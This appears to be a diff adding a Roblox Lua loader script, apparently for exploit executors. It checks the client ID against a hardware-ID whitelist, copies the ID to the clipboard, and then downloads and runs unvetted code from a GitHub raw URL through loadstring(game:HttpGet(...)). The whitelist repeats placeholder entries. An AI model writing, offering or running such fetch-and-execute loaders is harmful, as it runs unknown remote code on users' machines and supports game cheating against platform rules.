@@ -1,0 +1,42 @@
+local HttpService = game:GetService("HttpService")
+
+-- Your allowed HWIDs (in real use you’d probably fetch this from a server)
+local allowedHWIDs = {
+    ["d81e-2ace-dca3-f780"] = true,
+    ["SOME_HWID_2"] = true,
+    ["SOME_HWID_1"] = true,
+    ["SOME_HWID_2"] = true,
+    ["SOME_HWID_1"] = true,
+    ["SOME_HWID_2"] = true,
+    -- add more here
+}
+
+-- Safely get the HWID
+local function getHWID()
+    local success, clientId = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    if success and clientId then
+        return clientId
+    else
+        return nil
+    end
+end
+
+local hwid = getHWID()
+if not hwid then
+    warn("Failed to retrieve HWID.")
+    return -- stop execution
+end
+
+print("Your HWID: " .. hwid)
+pcall(setclipboard, hwid) -- try to copy, don’t error if unavailable
+
+-- Whitelist check
+if not allowedHWIDs[hwid] then
+    warn("HWID not allowed: " .. hwid)
+    return -- abort/script disabled
+end
+
+-- If allowed, proceed to load the remote script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lllllllllllllllllllllIl/xpxp/refs/heads/main/Wrk"))()
